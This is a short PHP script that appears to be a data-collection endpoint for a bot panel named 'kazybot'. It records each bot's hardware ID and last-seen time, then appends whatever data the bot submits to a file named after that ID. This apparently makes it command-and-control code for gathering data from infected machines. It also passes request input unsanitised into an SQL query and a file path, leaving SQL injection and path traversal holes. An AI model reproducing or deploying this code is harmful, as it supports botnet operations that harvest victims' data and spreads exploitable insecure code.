<?php
require_once("settings.php");
mysqli_query($sql, "UPDATE kazybot SET LAST=NOW() WHERE HWID='" . substr($_REQUEST['HWID'], 0, strlen($_REQUEST['HWID']) - 1) . "'");
$file = fopen("data/" . $_REQUEST['HWID'] . ".dat", "a");
flock($file, LOCK_EX);
fwrite($file, $_REQUEST['DATA'] . "\n");
fclose($file);
?>